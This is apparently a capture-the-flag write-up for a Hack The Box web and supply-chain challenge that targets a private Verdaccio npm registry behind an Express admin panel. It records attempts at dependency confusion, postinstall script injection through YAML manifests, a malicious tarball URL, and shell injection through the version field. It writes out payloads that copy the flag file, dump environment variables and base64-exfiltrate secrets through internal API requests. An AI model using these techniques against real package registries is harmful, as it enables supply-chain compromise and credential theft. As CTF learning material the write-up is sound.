# Ecto-Registry CTF Challenge — Investigation Notes

**Target:** `http://154.57.164.78:31800`  
**Challenge type:** Web / Supply Chain (npm / Verdaccio)

---

## Challenge Description

> Whispered among the Spectral Corsair's crew is a forbidden art: the manipulating of arcane supply lines to summon corrupted modules. The private registry, guarded by the watchful Verdaccio sentinel, can be tricked into fetching treacherous code from beyond the known seas. Only a cunning necromancer of Node alchemy can plant a malevolent ecto-spirit into the registry's ledger, waiting for the nightly tide to pull it into the heart of the ghost ship's engines.

**Key hints:**
- Private Verdaccio npm registry
- We can modify the registry's "ledger" (module manifests)
- A scheduled job ("nightly tide") runs `npm install` against the registry
- The registry can be tricked into fetching from an external source

---

## Application Overview

A Node.js/Express app behind nginx. Serves an admin panel for managing "ecto-modules" — ghost pirate characters with YAML manifests. The admin panel is the only externally exposed interface; Verdaccio runs internally only.

### API Endpoints

| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/modules` | List all modules with metadata |
| GET | `/api/modules/{id}` | Get full module including `raw` YAML and parsed `data` |
| PUT | `/api/modules/{id}` | Update module manifest (body: `{"manifest": "<yaml>"}`) |

Verdaccio is **not** directly accessible from outside. Ports 4873, 4874, and others were unreachable. The Express app responds with `{"message":"404 page not found"}` for all unknown paths.

---

## Module Inventory

| ID | Name | Version | npm Package Name |
|----|------|---------|-----------------|
| ECT-987654 | Siren's Lament | 2.14.789 | `sirens-lament` |
| ECT-472839 | Blackbeard's Navigator | 1.23.456 | `blackbeards-navigator` |
| ECT-654321 | Siren's Lament | 2.14.789 | unknown / `ect-654321` |
| ECT-839201 | Gunpowder Ghost | 3.45.012 | `gunpowder-ghost` |

### YAML Manifest Format

```yaml
ecto_module:
  name: "Blackbeard's Navigator"
  version: "1.23.456"
  power_level: High
  soul_portrait: "https://hackthebox.com/spectral-forms/blackbeard_navigator.jpg"
  ship_deck: "Alpha-1"
  cargo_hold: "A1-01"
  spectral_duties:
    - "..."
  # ... many flavour fields
```

The `PUT` endpoint stores the full raw YAML. The `data` response object only parses: `name`, `version`, `power_level`, `ship_deck`, `cargo_hold`. Extra fields (including injected `scripts`) are stored in `raw` but not reflected in `data`.

---

## npm Registry Reconnaissance

Checked `registry.npmjs.org` for all candidate package names.

### Squatted by npm security (unusable)

These were published by previous CTF players, detected as malicious, and taken over by npm:

| Package | npm Status | Versions in history |
|---------|-----------|---------------------|
| `sirens-lament` | `0.0.1-security` (squatted) | 200.x–225.x, 9999.0.0 |
| `blackbeards-navigator` | `0.0.1-security` (squatted) | 1.23.456, 1.23.457 |
| `gunpowder-ghost` | `0.0.1-security` (squatted) | 3.45.12 |

### Previously used, now empty (versions unpublished)

| Package | Notes |
|---------|-------|
| `ect-472839` | versions 1.23.456–1.23.463 published by prior players, 9999.0.0 then all unpublished |
| `ect-987654` | 9999.0.0 published then unpublished |
| `siren-lament` | versions 2.14.790–2.14.832 published then unpublished |
| `blackbeard-navigator` | 9999.0.0 published then unpublished |

### Does not exist (publishable)

| Package | Notes |
|---------|-------|
| `ect-654321` | Never published — potentially valid npm name for ECT-654321 |
| `ect-839201` | Never published — potentially valid npm name for ECT-839201 |

---

## Attack Vectors Tried

### 1. Dependency Confusion via Public npm (Blocked)

**Theory:** Verdaccio uplinks to npm. If a package with the same name exists on npm at a higher version, Verdaccio fetches it, and the malicious `postinstall` script runs.

**What worked:** Confirmed the npm package names (`sirens-lament`, `blackbeards-navigator`, `gunpowder-ghost`) by matching version numbers in npm history against Verdaccio manifest versions.

**What failed:** All three target package names were squatted by npm's security team after prior players triggered abuse detection. Cannot publish new versions to squatted packages.

---

### 2. `scripts.postinstall` YAML Injection

**Theory:** The backend converts the YAML manifest into an npm package (including any `scripts` block), publishes it to Verdaccio, and the nightly `npm install` triggers `postinstall`.

**What we did:** Injected into all 4 modules:
```yaml
scripts:
  postinstall: "cp /flag.txt /app/static/f.txt 2>/dev/null; printenv > /app/static/env.txt 2>/dev/null; true"
```

**Status:** The `scripts` field is stored in `raw` but absent from the parsed `data` response. Unknown whether the backend passes it to Verdaccio. No confirmation of execution after 5+ minutes of polling. Awaiting cron.

---

### 3. `soul_portrait` as `dist.tarball` + GitHub-hosted Tarball

**Theory:** The `soul_portrait` URL field maps to Verdaccio's `dist.tarball`. When npm fetches the package from Verdaccio, Verdaccio redirects/proxies to `soul_portrait`. Pointing it to a GitHub archive of a malicious package triggers install.

**What we did:**
1. Created `package.json` in `https://github.com/cryolithic/AE2RecursivePatternPrinter` with `postinstall` payload
2. Set `soul_portrait` to `https://github.com/cryolithic/AE2RecursivePatternPrinter/archive/refs/heads/main.tar.gz` for all modules
3. Bumped versions to `999.0.0` so Verdaccio has no cached copy and must fetch fresh

**Postinstall payload (exfil via internal API self-update):**
```bash
F=$(cat /flag.txt 2>/dev/null | base64 | tr -d '\n')
for p in 3000 3001 4000 5000 8000 8080 31800; do
  curl -sf -X PUT http://127.0.0.1:$p/api/modules/ECT-839201 \
    -H 'Content-Type: application/json' \
    -d "{\"manifest\":\"stolen: $F\"}" && break
done; true
```

After execution, the flag would appear as base64 in the `ECT-839201` module manifest, readable via `GET /api/modules/ECT-839201`.

**Status:** Currently polling. Awaiting nightly cron.

---

### 4. Command Injection via `version` Field

**Theory:** If the backend runs `npm install <name>@<version>` via shell exec, injecting `||` into the version field would execute our command when npm fails.

**What we tried:**
```yaml
version: "2.14.789 || cp /flag.txt /app/static/f.txt"
```

**Status:** No immediate execution. Only fires if/when the cron runs this code path.

---

### 5. File Hosting for Tarball (Failed)

We attempted to host the malicious `.tgz` at multiple services:
- `transfer.sh` — connection timed out
- `catbox.moe` — rejected (requires user hash)
- `0x0.st` — no response
- `file.io` — redirect loop

**Resolution:** Used GitHub raw archive URL instead, which doesn't require a separate hosting service.

---

## Exfiltration Strategy

Since we cannot confirm the static file path inside the container, we use **self-update via internal API**:

The postinstall script iterates over common internal ports (3000, 3001, 4000, 5000, 8000, 8080, 31800), attempts to PUT to `/api/modules/ECT-839201` with the flag as base64 in the manifest. After the cron fires, a `GET /api/modules/ECT-839201` will reveal the flag in the `raw` field.

---

## Current State

All 4 modules have been updated with:
- `version: "999.0.0"` (forces cache miss in Verdaccio)
- `soul_portrait:` GitHub archive URL (malicious tarball source)
- `scripts.postinstall:` internal-API-based flag exfiltration

Polling `GET /api/modules/ECT-839201` every 30 seconds for the flag to appear as `stolen: <base64>`.

---

## Key Unknowns

1. **Does `soul_portrait` → `dist.tarball`?** Never confirmed; only inferred from field semantics and challenge description.
2. **Does the backend include `scripts` when creating Verdaccio packages?** The `data` response omits `scripts`, suggesting it may be ignored.
3. **Cron frequency:** Challenge says "nightly" — may be once per day, may be every few minutes in CTF context.
4. **Internal app port:** Trying 3000, 3001, 4000, 5000, 8000, 8080, 31800 in postinstall.
5. **Flag location:** Assuming `/flag.txt`; also searched with `find` in earlier payloads.
